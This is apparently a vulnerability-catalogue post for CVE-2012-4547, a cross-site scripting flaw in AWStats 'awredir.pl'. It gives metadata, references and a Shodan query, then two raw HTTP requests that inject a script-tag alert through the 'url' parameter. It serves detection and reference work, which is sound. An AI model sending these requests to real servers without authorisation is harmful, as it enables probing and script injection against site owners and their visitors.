---
layout: post
cve_id: CVE-2012-4547
title: AWStats 6.95/7.0 - 'awredir.pl' Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2012/CVE-2012-4547.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2012/CVE-2012-4547.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dhiyaneshDk
severity: medium
remediation: 'Apply the latest security patches and updates from the vendor to address
  this vulnerability.

  '
impact: 'Allows remote attackers to inject arbitrary web script or HTML via the ''url''
  parameter.

  '
reference:
- https://www.exploit-db.com/exploits/36164
- https://nvd.nist.gov/vuln/detail/CVE-2012-4547
- http://awstats.sourceforge.net/docs/awstats_changelog.txt
- http://openwall.com/lists/oss-security/2012/10/29/7
- http://openwall.com/lists/oss-security/2012/10/26/1
classification:
  cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N
  cvss-score: 4.3
  cve-id: CVE-2012-4547
  cwe-id: CWE-79
  epss-score: 0.37906
  epss-percentile: 0.97079
  cpe: cpe:2.3:a:laurent_destailleur:awstats:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: laurent_destailleur
  product: awstats
  shodan-query: cpe:"cpe:2.3:a:laurent_destailleur:awstats"
tags:
- cve2012
- cve
- xss
- awstats
- edb
- laurent_destailleur
- vuln
---

## üîç Vulnerability Description
AWStats is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.

## üåê HTTP Request
```nohighlight
GET /awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.7.20) Gecko/ Firefox/3.6.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /cgi-bin/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

